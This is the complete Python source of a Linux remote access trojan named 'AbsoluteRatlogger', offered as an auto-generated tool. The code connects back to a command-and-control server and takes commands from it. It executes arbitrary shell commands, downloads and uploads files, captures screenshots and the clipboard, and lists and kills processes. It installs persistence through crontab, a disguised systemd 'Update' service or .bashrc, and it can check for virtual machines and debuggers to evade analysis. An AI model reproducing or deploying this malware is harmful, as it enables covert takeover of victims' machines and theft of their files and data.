#!/usr/bin/env python3
"""AbsoluteRatlogger Linux RAT — auto-generated by @Ethical_Developer"""
import os, sys, json, socket, struct, time, threading, subprocess, platform

CONFIG = {
  "c2_host": "127.0.0.1",
  "c2_port": 4444,
  "modules": [
    "command_exec",
    "sysinfo",
    "process_enum",
    "persistence"
  ],
  "evasion": [],
  "platform": "linux"
}
C2_HOST = CONFIG["c2_host"]
C2_PORT = CONFIG["c2_port"]
MAGIC = b"PHNT"

CMD_REGISTER=0x01; CMD_SHELL=0x10; CMD_SHELL_RESP=0x11
CMD_UPLOAD=0x20; CMD_DOWNLOAD=0x21; CMD_FILE_RESP=0x22
CMD_SCREEN=0x30; CMD_SCREEN_RESP=0x31
CMD_KEYLOG=0x40; CMD_KEYLOG_RESP=0x41
CMD_SYSINFO=0x50; CMD_SYSINFO_RESP=0x51
CMD_PROCESS=0x60; CMD_PROCESS_RESP=0x61
CMD_PERSIST=0x70; CMD_PERSIST_RESP=0x71
CMD_CLIPBOARD=0x90; CMD_CLIP_RESP=0x91
CMD_EXIT=0xFF

def pack_msg(ct, data):
    if isinstance(data, str): data = data.encode()
    return struct.pack(">4sII", MAGIC, ct, len(data)) + data

def recv_msg(sock):
    h = recv_exact(sock, 12)
    if not h: return None, None
    magic, ct, dl = struct.unpack(">4sII", h)
    if magic != MAGIC: return None, None
    d = recv_exact(sock, dl) if dl else b""
    return ct, d

def recv_exact(sock, n):
    buf = b""
    while len(buf) < n:
        try:
            c = sock.recv(n - len(buf))
            if not c: return None
            buf += c
        except: return None
    return buf

def is_vm():
    try:
        for p in ["/sys/class/dmi/id/sys_vendor", "/sys/class/dmi/id/product_name"]:
            with open(p) as f:
                v = f.read().lower()
                if any(x in v for x in ["vmware","virtualbox","qemu","xen","microsoft","kvm"]):
                    return True
    except: pass
    return False

def is_debugged():
    try:
        with open(f"/proc/self/status") as f:
            for line in f:
                if line.startswith("TracerPid:"):
                    return int(line.split(":")[1].strip()) != 0
    except: pass
    return False

def handle_shell(data):
    cmd = data.decode("utf-8","replace")
    try:
        p = subprocess.run(["/bin/bash","-c",cmd], capture_output=True, timeout=60)
        return p.stdout + p.stderr or b"(no output)"
    except Exception as e:
        return str(e).encode()

def handle_sysinfo(data):
    return json.dumps({
        "hostname": socket.gethostname(),
        "os": f"{platform.system()} {platform.release()}",
        "user": os.environ.get("USER","unknown"),
        "pid": os.getpid(),
    }).encode()

def handle_process(data):
    cmd = data.decode("utf-8","replace")
    if cmd.startswith("list"):
        try:
            out = subprocess.check_output(["ps","aux"], text=True)
            return out.encode()
        except Exception as e: return str(e).encode()
    elif cmd.startswith("kill "):
        try:
            pid = int(cmd[5:])
            os.kill(pid, 9)
            return b"ok"
        except Exception as e: return str(e).encode()
    return b"unknown"

def handle_persist(data):
    method = data.decode("utf-8","replace")
    script = os.path.abspath(__file__)
    py = sys.executable
    try:
        if method in ("auto","crontab"):
            entry = f"*/5 * * * * {py} {script}\n"
            try:
                ex = subprocess.check_output(["crontab","-l"], text=True, stderr=subprocess.DEVNULL)
            except: ex = ""
            subprocess.run(["crontab","-"], input=ex+entry, text=True)
            return b"ok: crontab installed"
        elif method == "systemd":
            svc = f"""[Unit]
Description=AbsoluteRatlogger Update
After=network.target
[Service]
Type=simple
ExecStart={py} {script}
Restart=always
RestartSec=30
[Install]
WantedBy=multi-user.target
"""
            try:
                with open("/etc/systemd/system/absolutespy.service","w") as f: f.write(svc)
                subprocess.run(["systemctl","daemon-reload"])
                subprocess.run(["systemctl","enable","absolutespy"])
                subprocess.run(["systemctl","start","absolutespy"])
                return b"ok: systemd installed"
            except PermissionError: return b"error: needs root"
        elif method == "bashrc":
            with open(os.path.expanduser("~/.bashrc"), "a") as f:
                f.write(f"\n# AbsoluteRatlogger\n{py} {script} &\n")
            return b"ok: bashrc installed"
    except Exception as e: return str(e).encode()

def handle_download(data):
    path = data.decode("utf-8","replace")
    try:
        with open(path, "rb") as f: return f.read()
    except Exception as e: return str(e).encode()

def handle_upload(data):
    if len(data) < 4: return b"error"
    pl = struct.unpack(">I", data[:4])[0]
    path = data[4:4+pl].decode("utf-8","replace")
    content = data[4+pl:]
    try:
        with open(path, "wb") as f: f.write(content)
        return b"ok"
    except Exception as e: return str(e).encode()

def handle_screen(data):
    try:
        import tempfile
        tmp = tempfile.mktemp(suffix=".jpg")
        for tool in (["import","-window","root",tmp], ["scrot",tmp]):
            r = subprocess.run(tool, capture_output=True, timeout=5)
            if r.returncode == 0 and os.path.exists(tmp):
                with open(tmp,"rb") as f: d = f.read()
                os.unlink(tmp)
                return d
        return b"error: install scrot or imagemagick"
    except Exception as e: return str(e).encode()

def handle_clipboard(data):
    try:
        r = subprocess.run(["xclip","-selection","clipboard","-o"], capture_output=True, timeout=5)
        if r.returncode == 0: return r.stdout
        return b"(empty or xclip not installed)"
    except: return b"error"

def handle_keylog(data):
    return b"keylog not implemented on Linux in this build"

def main():
    ev = CONFIG.get("evasion", [])
    if "anti_vm" in ev and is_vm():
        sys.exit(0)
    if "anti_debug" in ev and is_debugged():
        sys.exit(0)

    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(30)
            sock.connect((C2_HOST, C2_PORT))

            reg = json.dumps({
                "hostname": socket.gethostname(),
                "os": f"{platform.system()} {platform.release()}",
                "user": os.environ.get("USER","unknown"),
                "pid": os.getpid(),
                "seed": "absolutespy",
            }).encode()
            sock.sendall(pack_msg(CMD_REGISTER, reg))

            while True:
                ct, data = recv_msg(sock)
                if ct is None: break

                resp = b""
                if ct == CMD_SHELL:
                    resp = handle_shell(data)
                    sock.sendall(pack_msg(CMD_SHELL_RESP, resp))
                elif ct == CMD_SYSINFO:
                    resp = handle_sysinfo(data)
                    sock.sendall(pack_msg(CMD_SYSINFO_RESP, resp))
                elif ct == CMD_PROCESS:
                    resp = handle_process(data)
                    sock.sendall(pack_msg(CMD_PROCESS_RESP, resp))
                elif ct == CMD_PERSIST:
                    resp = handle_persist(data)
                    sock.sendall(pack_msg(CMD_PERSIST_RESP, resp))
                elif ct == CMD_DOWNLOAD:
                    resp = handle_download(data)
                    sock.sendall(pack_msg(CMD_FILE_RESP, resp))
                elif ct == CMD_UPLOAD:
                    resp = handle_upload(data)
                    sock.sendall(pack_msg(CMD_FILE_RESP, resp))
                elif ct == CMD_SCREEN:
                    resp = handle_screen(data)
                    sock.sendall(pack_msg(CMD_SCREEN_RESP, resp))
                elif ct == CMD_CLIPBOARD:
                    resp = handle_clipboard(data)
                    sock.sendall(pack_msg(CMD_CLIP_RESP, resp))
                elif ct == CMD_KEYLOG:
                    resp = handle_keylog(data)
                    sock.sendall(pack_msg(CMD_KEYLOG_RESP, resp))
                elif ct == CMD_EXIT:
                    break

            sock.close()
        except (ConnectionError, socket.timeout, OSError):
            pass
        except Exception:
            pass
        time.sleep(5)

if __name__ == "__main__":
    main()
